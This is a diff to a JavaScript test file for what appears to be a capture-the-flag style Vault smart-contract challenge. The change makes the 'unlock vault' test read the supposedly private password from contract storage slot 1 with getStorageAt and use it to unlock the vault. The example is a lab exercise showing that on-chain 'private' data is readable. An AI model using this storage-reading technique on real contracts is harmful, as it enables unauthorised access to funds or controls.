@@ -16,6 +16,7 @@ describe("Delegation", function () {
         [owner, sami] = await ethers.getSigners();
         const Vault = await ethers.getContractFactory("Vault");
         vault = (await Vault.connect(owner).deploy(ethers.utils.formatBytes32String(passwd))) as Vault;
+        console.log("initial password: ", ethers.utils.formatBytes32String(passwd));
         await vault.deployed();
         console.log("contract address: ", vault.address);
         vaultStatus = await vault.getVaultStatus();
@@ -24,7 +25,9 @@ describe("Delegation", function () {
 
     it("unlock vault", async function () {
         
-        await vault.unlock(ethers.utils.formatBytes32String(passwd)); // is this proper way of breaking the contract?
+        const potentialPasswd = await ethers.provider.getStorageAt(vault.address, 1);
+        console.log("potential password: ", potentialPasswd);
+        await vault.unlock(potentialPasswd);
     });
 
     it("get Vault Status again", async function () {
